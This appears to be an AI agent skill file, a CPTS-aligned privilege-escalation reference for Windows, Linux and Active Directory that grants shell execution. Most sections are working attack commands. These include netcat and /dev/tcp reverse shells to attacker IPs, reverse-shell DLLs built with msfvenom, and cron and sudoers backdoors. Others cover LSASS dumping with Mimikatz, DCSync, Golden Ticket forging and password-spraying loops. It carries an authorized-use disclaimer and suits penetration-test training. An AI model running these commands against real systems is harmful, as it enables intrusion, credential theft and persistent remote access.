---
name: cpts-privilege-escalation
description: "CPTS Privilege Escalation: Windows PrivEsc (SeImpersonate, SeDebug, UAC, kernel exploits, vulnerable services, credential theft), Linux PrivEsc (sudo abuse, capabilities, cron jobs, Docker, kernel exploits), and Active Directory attacks (LLMNR poisoning, password spraying, Kerberoasting, DCSync, ACL abuse, domain trusts). Use when escalating privileges on Windows/Linux or attacking Active Directory."
argument-hint: "[os-type] [technique]"
allowed-tools:
  - read
  - grep
  - glob
  - exec
  - webfetch
triggers:
  - user
  - model
---

> ⚠️ **AUTHORIZED USE ONLY** ⚠️
>
> This skill is provided for **authorized penetration testing, security research, and educational purposes only**. All techniques, commands, and tools described herein must ONLY be used against systems for which you have **explicit written authorization**. Unauthorized access to computer systems is illegal. The user assumes all legal and ethical responsibility for their actions. Always operate within the agreed-upon scope and rules of engagement.

# CPTS Privilege Escalation Skill

**Purpose:** Comprehensive reference for privilege escalation on Windows, Linux, and Active Directory environments, covering enumeration, exploitation, credential theft, and post-exploitation techniques aligned with the HTB CPTS curriculum.

---

# PART 1: WINDOWS PRIVILEGE ESCALATION

## 1.1 Getting the Lay of the Land — Situational Awareness & Initial Enumeration

### RDP & Network
```bash
xfreerdp /v:<target ip> /u:htb-student
ipconfig /all
arp -a
route print
netstat -ano
```

### AppLocker & Defender
```powershell
Get-MpComputerStatus
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

### System Information
```powershell
set
systeminfo
ver
wmic qfe
wmic qfe list brief
Get-HotFix
wmic product get name
Get-WmiObject Win32_Product | Select-Object Name, Version
tasklist /svc
Get-Service
Get-Process
driverquery
```

### Users, Groups & Processes
```powershell
query user
echo %USERNAME%
whoami /all
whoami /user
whoami /priv
whoami /groups
net user
net user <username>
net localgroup
net localgroup <groupname>
net localgroup administrators
net accounts
Get-LocalUser
Get-LocalGroup
```

### File System and Environment
```powershell
dir
type
set
echo %PATH%
icacls
reg query
Get-ItemProperty
Get-ChildItem
Get-Acl
```

### Scheduled Tasks
```powershell
schtasks /query /fo LIST /v
Get-ScheduledTask
```

### Named Pipes
```powershell
pipelist.exe /accepteula
gci \\.\pipe\
accesschk.exe /accepteula \\.\Pipe\lsass -v
```

### Network Information
```powershell
ipconfig /all
netstat -ano
arp -a
route print
nslookup
```

---

## 1.2 Windows User Privileges

### SeImpersonate & SeAssignPrimaryToken Privilege Abuse

These privileges allow impersonation of client tokens. Service accounts (MSSQL, IIS) often hold `SeImpersonatePrivilege`, making them prime targets for "Potato" attacks.

**MSSQL Privilege Escalation via xp_cmdshell:**
```bash
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```
```sql
enable_xp_cmdshell
xp_cmdshell whoami
xp_cmdshell whoami /priv
```

**Exploiting with JuicyPotato (older Windows):**
```sql
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```
```bash
nc -lnvp 8443
```

**Exploiting with PrintSpoofer (newer Windows):**
```sql
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

**Key notes:**
- `SeImpersonatePrivilege` — impersonate other user tokens; abused via "Potato" attacks.
- `SeAssignPrimaryToken` — relates to process tokens.
- JuicyPotato fails on newer Windows (Server 2019+); use PrintSpoofer or RoguePotato instead.
- Service accounts (SQL Server, IIS) are common holders of these privileges.

### SeDebugPrivilege Abuse

`SeDebugPrivilege` allows debugging (and thus memory access to) any process, including SYSTEM-level processes like LSASS.

**1. Verify SeDebugPrivilege:**
```powershell
whoami /priv
```

**2. Dump LSASS:**
```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
- Alternatively via Task Manager: Right-click `lsass.exe` → Create dump file.

**3. Extract Credentials with Mimikatz:**
```powershell
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

**4. RCE as SYSTEM (parent PID spoofing):**
```powershell
[MyProcess]::CreateProcessFromParent(<PID>,"cmd.exe","")
```

**Tools & Techniques:**
- **pypykatz:** LSASS dump analysis on non-Windows systems.
- **Process Explorer (Sysinternals):** detailed process information.
- **WinDbg:** advanced process debugging and memory analysis.
- **DLL Injection:** inject malicious code into privileged processes.
- **Handle Duplication:** gain access to privileged process resources.
- **Exploiting Vulnerable Drivers:** leverage SeDebugPrivilege to exploit kernel vulnerabilities.

---

## 1.3 Windows Group Privileges — DnsAdmins Exploitation

Members of the `DnsAdmins` group can load a custom DLL into the DNS server, which runs as SYSTEM. This is a powerful privilege escalation vector in AD environments.

### 1. Generate a Malicious DLL
```bash
msfvenom -p windows/x64/exec cmd='<command>' -f dll -o <dll_name>.dll
```

### 2. Host DLL on an HTTP Server
```bash
python3 -m http.server <port>
```

### 3. Transfer DLL to Target
```powershell
wget "http://<attacker_ip>:<port>/<dll_name>.dll" -outfile "<dll_name>.dll"
```

### 4. Verify DnsAdmins Membership
```powershell
Get-ADGroupMember -Identity DnsAdmins
```

### 5. Load Custom DLL into DNS Server Configuration
```cmd
dnscmd.exe /config /serverlevelplugindll <dll_path>
```

### 6. Check Permissions on DNS Service
```cmd
wmic useraccount where name="<user>" get sid
sc.exe sdshow DNS
```

### 7. Restart DNS Service to Trigger Payload
```cmd
sc stop dns
sc start dns
```

### 8. Verify Exploitation
```cmd
net group "Domain Admins" /dom
```

### 9. Cleanup
```cmd
reg query \\<target_ip>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
reg delete \\<target_ip>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
sc.exe start dns
sc query dns
```

### Alternative: WPAD Attack via DNS
```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName <dc_hostname>
Add-DnsServerResourceRecordA -Name wpad -ZoneName <domain_name> -ComputerName <dc_hostname> -IPv4Address <attacker_ip>
```

### Using mimilib.dll
Modify `kdns.c` from mimikatz's mimilib to execute a reverse shell one-liner via `system()` call in `kdns_DnsPluginQuery`, then load it as the server-level plugin DLL.

---

## 1.4 Attacking the OS

### User Account Control (UAC) Bypass

UAC separates standard user and administrator tokens. It is a security convenience, not a security boundary. Auto-elevating binaries + DLL hijacking are common bypass techniques.

**Reconnaissance:**
```powershell
whoami /user
net localgroup administrators
whoami /priv
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
[environment]::OSVersion.Version
cmd /c echo %PATH%
tasklist /svc | findstr "rundll32"
taskkill /PID <pid> /F
```

**DLL Hijacking via auto-elevating binary (SystemPropertiesAdvanced.exe):**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f dll > srrstr.dll
python3 -m http.server <port>
```
```powershell
curl http://<attacker_ip>:<port>/srrstr.dll -O "C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```
```bash
nc -lvnp <attacker_port>
```
```powershell
rundll32 shell32.dll,Control_RunDLL C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\srrstr.dll
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
whoami
```

**Key considerations:**
- Windows version and build number are critical for UAC bypass selection.
- DLL search order matters — Windows DLL search order is critical.
- `SystemPropertiesAdvanced.exe` is an auto-elevating binary.

### Weak Permissions

Services run as SYSTEM, making them key targets for permission-based escalation.

**1. Permissive File System ACLs (SecurityService):**
```powershell
.\SharpUp.exe audit
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
sc start SecurityService
```

**2. Weak Service Permissions (WindscribeService):**
```powershell
SharpUp.exe audit
accesschk.exe /accepteula -quvcw WindscribeService
net localgroup administrators
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
sc stop WindscribeService
sc start WindscribeService
net localgroup administrators
sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
sc start WindScribeService
sc query WindScribeService
```

**3. Unquoted Service Paths (SystemExplorerHelpService):**
```powershell
sc qc SystemExplorerHelpService
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

**4. Permissive Registry ACLs (ModelManagerService):**
```powershell
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

**5. Modifiable Registry Autorun Binary:**
```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

**Detection tools:** `SharpUp`, `accesschk`, `icacls`, `wmic`, PowerShell.

### Kernel Exploits

**Enumeration:**
```powershell
systeminfo
wmic qfe list brief
Get-Hotfix
icacls
whoami /priv
ls \\localhost\pipe\spoolss
```

**HiveNightmare (CVE-2021-36934) — registry hive access:**
```powershell
HiveNightmare.exe
```
```bash
impacket-secretsdump
```

**PrintNightmare (CVE-2021-1675 / CVE-2021-34527) — print spooler RCE:**
```powershell
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```

**CVE-2020-0668 (Service Tracing LPE):**
```bash
msfvenom
python3 -m http.server <port>
wget http://<ip>:<port>/<file>
```
```powershell
CVE-2020-0668.exe <source> <destination>
copy /Y <source> <destination>
msfconsole -r <resource_file>
net start MozillaMaintenance
```

**Verification:**
```powershell
net user hacker
getuid
hashdump
```

**Historical vulnerabilities:** MS08-067 (Server service RCE), MS17-010 (EternalBlue), ALPC Task Scheduler 0-Day, CVE-2021-36934 (HiveNightmare), CVE-2021-1675/CVE-2021-34527 (PrintNightmare), CVE-2020-0668 (Service Tracing).

### Vulnerable Services (Third-Party)

**Enumeration:**
```powershell
wmic product get name
netstat -ano | findstr 6064
get-process -Id 3324
get-service | ? {$_.DisplayName -like 'Druva*'}
```

**Exploitation (Druva inSync CVE — command injection via RPC as SYSTEM):**
```powershell
python3 -m http.server 8080
nc -lvnp 9443
Set-ExecutionPolicy Bypass -Scope Process
```
- Modify the provided PowerShell PoC script: change `$cmd` to execute a reverse shell, download `Invoke-PowerShellTcp.ps1`, host it, and execute.

**Verification:**
```powershell
whoami
hostname
```

---

## 1.5 Credential Theft — Credential Hunting

### Search Configuration Files for Passwords
```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

### Chrome Custom Dictionary
```powershell
gc 'C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

### PowerShell History
```powershell
(Get-PSReadLineOption).HistorySavePath
gc (Get-PSReadLineOption).HistorySavePath
```

### Extract PowerShell History from All User Profiles
```powershell
foreach($user in (Get-ChildItem C:\users).FullName){
    Get-Content "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
}
```

### PowerShell Credentials (DPAPI-encrypted XML)
```powershell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```

### Other Credential Sources
- **Unattended installation files:** `unattend.xml` with auto-logon or account creation credentials.
- **Application configuration files:** plaintext or weakly encrypted credentials.
- **Manual inspection of `web.config` files.**

---

## 1.6 Handy Windows PrivEsc Commands (Quick Reference)

### LSASS Dumping & Mimikatz
```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

### File Ownership & ACLs
```powershell
dir /q C:\backups\wwwroot\web.config
takeown /f C:\backups\wwwroot\web.config
Get-ChildItem -Path 'C:\backups\wwwroot\web.config' | select name, directory, @{Name="Owner"; Expression={(Get-ACL $_.Fullname).Owner}}
icacls "C:\backups\wwwroot\web.config" /grant htb-student:F
```

### Hash Extraction & File Copy
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
robocopy /B E:\Windows\NTDS\ntds ntds.dit
```

### Event Logs
```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } | Select-Object @{name='CommandLine'; expression={ $_.Properties[8].Value }}
```

### File Transfer & Execution
```powershell
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

---

# PART 2: LINUX PRIVILEGE ESCALATION

## 2.1 Quick System Check & Environment Enumeration

### SSH to Target
```bash
ssh htb-student@<target IP>
```

### Basic System Information
```sh
whoami
id
hostname
ip a
sudo -l
```

### OS and Kernel
```sh
cat /etc/os-release
cat /etc/lsb-release
cat /proc/version
echo $PATH
env
uname -a
lscpu
cat /etc/shells
```

### Defenses (may require root/sudo)
```sh
iptables -L
apparmor_status
sestatus
ufw status
fail2ban-client status
snort -V
```

### Drives and Shares
```sh
lsblk
lpstat
cat /etc/fstab
route -n
netstat -rn
cat /etc/resolv.conf
arp -a
```

### Users and Groups
```sh
cat /etc/passwd
cat /etc/passwd | cut -f1 -d:
grep "*sh$" /etc/passwd
cat /etc/group
getent group sudo
ls /home
```

### File System and Hidden Files/Directories
```sh
df -h
cat /etc/fstab | grep -v "#" | column -t
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
find / -type d -name ".*" -ls 2>/dev/null
ls -l /tmp /var/tmp /dev/shm
```

### Process and User Enumeration
```bash
ps aux | grep root
ps au
```

### User Directory and SSH Key Check
```bash
ls /home
ls -l ~/.ssh
history
```

### Writable Directories and Files
```bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

### SUID and SETGID Files
```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

### Config File Discovery
```bash
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

### Shared Object and Binary Analysis
```bash
ldd /bin/ls
readelf -d payroll | grep PATH
```

### Process Monitoring
```bash
screen -v
./pspy64 -pf -i 1000
```

### System Audit
```bash
./lynis audit system
```

---

## 2.2 Sudo Rights Abuse

### Check Sudo Privileges
```sh
sudo -l
sudo -l | grep -E '(tcpdump|vim|nmap|find|less|\*)'
```

### tcpdump -z exploit
```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> <YOUR_PORT> >/tmp/f' > /tmp/.test
chmod +x /tmp/.test
nc -lnvp <YOUR_PORT>
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

### Path Hijacking (command without absolute path in sudoers)
```bash
echo $PATH | tr ":" "\n"
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > cat
chmod +x cat
sudo cat /etc/shadow
/tmp/rootbash -p
```

### GTFOBins Examples
```sh
sudo vim -c ':!/bin/sh'
sudo nmap --interactive -c '!sh'
sudo find . -exec /bin/bash \;
sudo less /etc/passwd -c '!/bin/sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo zip -TT 'sh #' /dev/null
```

### tar with wildcards exploit
```bash
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
sudo -l
sudo su
```

### systemctl exploit
```sh
sudo systemctl --force --batch enable 'sh -c "sh -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1".service'
sudo systemctl start sh-c*.service
```

### Best Practices Check
```sh
sudo visudo -c
sudo visudo -l
```

---

## 2.3 Capabilities

### Find Binaries with Capabilities
```sh
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

### Set / Clear / List Capabilities
```sh
sudo setcap cap_net_bind_service=+ep /usr/bin/my_program
sudo setcap -r /usr/bin/my_program
getcap /usr/bin/my_program
```

### Capability Values
- `=` (clear capabilities)
- `+ep` (effective and permitted)
- `+ei` (effective and inheritable)
- `+p` (permitted)

### Dangerous Capabilities
- `cap_sys_admin` — broad administrative privileges.
- `cap_setuid` — change user ID.
- `cap_setgid` — change group ID.
- `cap_dac_override` — bypass file permission checks.

### cap_dac_override — read restricted file
```sh
/usr/bin/vim.basic /etc/shadow
```

### cap_dac_override — overwrite a file
```bash
echo "evil code" > /tmp/evil.sh
chmod +x /tmp/evil.sh
echo -e ':%s/original content/malicious content/\nwq!' | /usr/bin/vim.basic -es /path/to/important/file
```

### Overwriting an SUID binary
```bash
cp /bin/bash /tmp/suid_bash
chmod u+s /tmp/suid_bash
echo -e ':%s/original content/malicious content/\nwq!' | /usr/bin/vim.basic -es /tmp/suid_bash
```

### cap_setuid — compiled C program
```c
#include <unistd.h>
#include <sys/capability.h>
#include <stdio.h>

int main() {
    cap_value_t cap_list[1];
    cap_list[0] = CAP_SETUID;
    cap_t caps = cap_get_proc();
    cap_set_flag(caps, CAP_EFFECTIVE, 1, cap_list, CAP_SET);
    cap_set_proc(caps);
    cap_free(caps);
    setuid(0);
    execl("/bin/sh", "/bin/sh", NULL);
    return 0;
}
```
```bash
gcc setuid.c -o setuid -lcap
sudo setcap cap_setuid+ep ./setuid
./setuid
```

### cap_sys_admin — mount a file system
```bash
mkdir /tmp/mnt
dd if=/dev/zero of=/tmp/loopback.img bs=1M count=10
mkfs.ext4 /tmp/loopback.img
sudo setcap cap_sys_admin+ep /bin/mount
mount /tmp/loopback.img /tmp/mnt -o loop
sudo setcap cap_sys_admin+ep /bin/umount
umount /tmp/mnt
```

### Checking Capability Sets
```bash
cat /proc/self/status | grep CapBnd
cat /proc/self/status | grep Cap
sudo cat /proc/$(pidof processname)/status | grep Cap
```

### Auditd Logging
```bash
sudo apt install auditd
sudo systemctl enable auditd
sudo systemctl start auditd
sudo auditctl -a always,exit -F arch=b64 -S capset,setcap,getcap -k capabilities
sudo ausearch -k capabilities -ts recent
```

---

## 2.4 Cron Job Abuse

### Find World-Writable Files (potential cron job scripts)
```bash
find / -path /proc -prune -o -type f -perm -o+w -exec ls -lah {} + 2>/dev/null
```

### List Files in a Suspicious Directory
```bash
ls -lah /dmz-backups/
```

### Check Cron Jobs
```bash
crontab -l
sudo crontab -l
cat /etc/crontab
ls -lah /etc/cron.d/
cat /etc/cron.d/* 2>/dev/null
```

### Monitor Background Processes with pspy
```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
chmod +x pspy64
./pspy64 -pf -i 1000
```

### Modify a Vulnerable Script
```bash
cp /dmz-backups/backup.sh /dmz-backups/backup.sh.bak
echo "bash -i >& /dev/tcp/10.10.14.3/443 0>&1" >> /dmz-backups/backup.sh
nc -lnvp 443
cp /dmz-backups/backup.sh.bak /dmz-backups/backup.sh
```

### Modify a Writable Cron Job File
```bash
cp /etc/cron.d/vulnerable_cron /etc/cron.d/vulnerable_cron.bak
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1'" >> /etc/cron.d/vulnerable_cron
cp /etc/cron.d/vulnerable_cron.bak /etc/cron.d/vulnerable_cron
```

---

## 2.5 Docker Privilege Escalation

### Check Docker Version / Images / Containers
```bash
docker version
docker image ls
docker ps -a
id
ls -l /var/run/docker.sock
```

### Download Docker Binary (if missing in container)
```bash
wget <URL_TO_DOCKER_BINARY> -O docker
chmod +x docker
```

### List Running Containers via Docker Socket
```bash
./docker -H unix:///var/run/docker.sock ps
```

### Run a Privileged Container with Host Root Mount
```bash
./docker -H unix:///var/run/docker.sock run --rm -d --privileged -v /:/hostsystem <image_name>
```

### Execute a Shell in the Privileged Container
```bash
./docker -H unix:///var/run/docker.sock exec -it <container_id> /bin/bash
```

### Access Host Files from Within the Container
```bash
cat /hostsystem/root/.ssh/id_rsa
```

### Run a Container with a Chroot into the Host
```bash
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

### Docker Compose
```bash
docker-compose ps -a
docker-compose exec <container_name> /bin/bash
docker-compose config --services <service_name>
```

**Privilege escalation vectors:** shared directories (volume mounts), Docker sockets, Docker group membership, writable Docker sockets.

---

## 2.6 Other Linux PrivEsc Techniques

### LD_PRELOAD Abuse
```bash
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

### Compile a Shared Library
```bash
gcc src.c -fPIC -shared -o /development/libshared.so
```

### LXD Privilege Escalation
```bash
lxd init
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
```

### NFS Exploitation
```bash
showmount -e 10.129.2.12
sudo mount -t nfs 10.129.2.12:/tmp /mnt
```

### Tmux Shared Sessions
```bash
tmux -S /shareds new -s debugsess
```

### Path Manipulation
```bash
echo $PATH
PATH=.:${PATH}
```

### Compiling Exploits
```bash
gcc kernel_exploit.c -o kernel_exploit
```

---

## 2.7 Linux Kernel Exploits

### Check Kernel Version and OS Details
```bash
uname -a
cat /etc/lsb-release
cat /etc/os-release
cat /proc/version
```

### Search for Kernel Exploits
```bash
searchsploit "Linux kernel 4.4.0-116"
```
- Online: Google `linux 4.4.0-116-generic exploit`, search Exploit-DB for the version.

### Download, Compile, Run
```bash
wget <exploit_url>
gcc <exploit_file>.c -o <exploit_binary>
chmod +x <exploit_binary>
./<exploit_binary>
```

### Verify Root Access
```bash
whoami
id
```

### Using Metasploit
```bash
msfconsole
search type:exploit platform:linux kernel <kernel version>
use <exploit path>
show options
set SESSION <session number>
set LHOST <attacker ip>
set LPORT <attacker port>
exploit
```

**Notable:** Dirty COW (CVE-2016-5195). Exploit success depends on kernel version, distribution, and patches. Kernel exploits can cause system crashes — use with caution. Use reputable sources like Exploit-DB or GitHub.

---

# PART 3: ACTIVE DIRECTORY ENUMERATION & ATTACKS

## 3.1 AD Penetration Test Checklist

### Initial Setup
- [ ] Confirm the scope of the pentest (domains, forests, subnets).
- [ ] Verify the rules of engagement (allowed/restricted actions, time constraints).
- [ ] Set up the pentest environment (PowerView, BloodHound, Mimikatz).
- [ ] Ensure network connectivity to the target domain.
- [ ] If credentials are provided, document them securely.
- [ ] Determine the testing approach (black-box vs white-box).

### Unauthenticated Reconnaissance
- [ ] DNS enumeration to identify domain controllers: `nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>`
- [ ] Scan for open ports: `nmap -p 88,389,445,3389 <target>`
- [ ] Check for anonymous LDAP bind (ldapsearch).
- [ ] Identify exposed services (SMB, RPC, HTTP).

### Authenticated Reconnaissance
- [ ] Map domain structure with BloodHound (`SharpHound.exe` or `bloodhound-python`).
- [ ] Enumerate users, groups, computers, GPOs with PowerView (`Get-NetDomain`, `Get-NetUser`, `Get-NetGroup`).
- [ ] Identify domain controllers: `Get-NetDomainController`.
- [ ] Discover trusts: `Get-NetDomainTrust`.

### User Enumeration
- [ ] List all user accounts: `Get-NetUser` / `Get-ADUser`.
- [ ] Identify privileged users (adminCount=1 or group membership).
- [ ] Find service accounts with SPNs: `Get-NetUser -SPN` / `Get-ADUser -Filter {ServicePrincipalName -ne "$null"}`.
- [ ] Check user descriptions for sensitive info.
- [ ] Look for inactive/disabled accounts (lastLogonTimestamp).

### Group / Computer / Share / GPO / Trust Enumeration
- [ ] List all groups: `Get-NetGroup`.
- [ ] Check nested group memberships: `Get-NetGroupMember -Recurse`.
- [ ] List all computers: `Get-NetComputer`.
- [ ] Check for unconstrained delegation: `Get-DomainComputer -Unconstrained`.
- [ ] Discover network shares: `Find-DomainShare`.
- [ ] List all GPOs: `Get-NetGPO`.
- [ ] Identify trusts: `Get-NetDomainTrust`.

### Vulnerability Assessment
- [ ] Password spraying: `cme smb <target> -u users.txt -p password`.
- [ ] Crack NTLM hashes: `hashcat -m 1000 hashes.txt wordlist.txt`.
- [ ] Kerberoasting: `Rubeus.exe kerberoast` / `Invoke-Kerberoast.ps1`; crack with `hashcat -m 13100`.
- [ ] Identify unconstrained/constrained delegation.
- [ ] Analyze ACLs for excessive permissions: `Get-ObjectAcl`.
- [ ] Check SYSVOL for exposed credentials (`.xml`, `.bat`).
- [ ] Verify SMB signing: `nmap --script smb-security-mode <target>`.

### Exploitation & Post-Exploitation
- [ ] Privilege escalation (UAC bypass, local service misconfigurations).
- [ ] Cached credentials: `Mimikatz.exe "sekurlsa::logonpasswords"`.
- [ ] Lateral movement: `PSExec.exe`, WMI, RDP.
- [ ] DCSync: `Mimikatz.exe "lsadump::dcsync /domain:<domain> /all"`.
- [ ] Dump local SAM hashes: `Mimikatz.exe "privilege::debug" "sekurlsa::sam"`.
- [ ] Persistence: scheduled tasks, Golden Ticket.
- [ ] Golden Ticket: `Mimikatz.exe "kerberos::golden /admin:<user> /domain:<domain> /sid:<sid> /krbtgt:<hash>"`.

---

## 3.2 Initial Enumeration of the Domain

### Network Discovery and Traffic Analysis
```bash
sudo wireshark
sudo tcpdump -i ens224
sudo responder -I ens224 -A
fping -asgq 172.16.5.0/23
```

### Host and Service Enumeration
```bash
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
sudo nmap -A 172.16.5.100
```

### User Enumeration with Kerbrute
```bash
sudo git clone https://github.com/ropnop/kerbrute.git
make help
sudo make all
./kerbrute_linux_amd64
echo $PATH
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

**Key data points:** AD users, AD-joined computers (especially Domain Controllers), key services (Kerberos, NetBIOS, LDAP, DNS), vulnerable hosts/services.

**The SYSTEM account:** `NT AUTHORITY\SYSTEM` on a domain-joined host provides significant access to the AD environment for further enumeration and attacks.

---

## 3.3 LLMNR/NBT-NS Poisoning from Linux

LLMNR (UDP 5355) and NBT-NS (UDP 137) are fallback name resolution protocols used by Windows when DNS fails. They broadcast requests, allowing any host to respond — enabling MitM credential capture.

### Pre-Attack Network Scanning
```bash
nmap -Pn --script broadcast-netbios-master-browser
nmap -p 5355 --script llmnr-resolve <target-ip>
```

### Responder Usage
```bash
responder -h
responder -I eth0 -w -r -f
responder -A
responder -I eth0
responder -I ens224
cat /usr/share/responder/logs/Responder-Session.log
```

### Crack Captured NTLMv2 Hashes
```bash
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
nohup hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt &
```

### Post-Exploitation
```bash
smbclient -U <username> //<target-ip>/share
```

**Tools:** Responder (Python, primary), Inveigh (C#/PowerShell, cross-platform), Metasploit (scanners/spoofing modules).

**Defensive measures:** Disable LLMNR and NBT-NS via Group Policy; enforce SMB signing to prevent relay attacks.

---

## 3.4 Password Spraying

### User Enumeration with Kerbrute
```bash
kerbrute userenum --dc <domain-controller> -d <domain> usernames.txt
```
```bash
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=frizz.htb 10.10.11.60
```

### Password Spraying with Kerbrute
```bash
kerbrute passwordspray --dc <domain-controller> -d <domain> -U usernames.txt -p <common-password>
```

### Password Spraying with CrackMapExec
```bash
cme smb <target-ip> -u usernames.txt -p <password> --no-bruteforce
```

### Obtaining Password Policy
```powershell
net accounts
Get-ADDefaultDomainPasswordPolicy
```

### Delay Between Sprays (avoid lockouts)
```bash
for password in Welcome1 Passw0rd Winter2022; do
    cme smb <target-ip> -u usernames.txt -p $password --no-bruteforce
    sleep 1800
done
```

### Handling Large User Lists
```bash
split -l 1000 usernames.txt user_chunk_
for file in user_chunk_*; do
    kerbrute passwordspray --dc <domain-controller> -d <domain> -U $file -p <password>
    sleep 1800
done
```

### Post-Spray Enumeration
```bash
cme smb <target-ip> -u <username> -p <password> --shares
cme smb <target-ip> -u <username> -p <password> --sessions
```

**Notes:** Always confirm the password policy before spraying. Adjust delay times based on lockout policy. Use minimal attempts to avoid detection and lockouts.

---

## 3.5 Credentialed Enumeration from Linux

### CrackMapExec (CME)
```bash
sudo crackmapexec smb <target_ip> -u <username> -p <password> --users
sudo crackmapexec smb <target_ip> -u <username> -p <password> --groups
sudo crackmapexec smb <target_ip> -u <username> -p <password> --loggedon-users
sudo crackmapexec smb <target_ip> -u <username> -p <password> --shares
sudo crackmapexec smb <target_ip> -u <username> -p <password> -M spider_plus --share '<share_name>'
```

### SMBMap
```bash
smbmap -u <username> -p <password> -d <domain> -H <target_ip>
smbmap -u <username> -p <password> -d <domain> -H <target_ip> -R '<share_name>' --dir-only
```

### rpcclient
```bash
rpcclient -U "" -N <target_ip>
rpcclient $> enumdomusers
rpcclient $> queryuser <rid>
```

### Impacket
```bash
psexec.py <domain>/<username>:'<password>'@<target_ip>
wmiexec.py <domain>/<username>:'<password>'@<target_ip>
psexec.py <domain>/<username>@<target_ip> -hashes <LM hash>:<NT hash>
```

### Windapsearch
```bash
windapsearch.py -d <domain> --dc-ip <dc_ip> -u <username> -p <password> --users
```
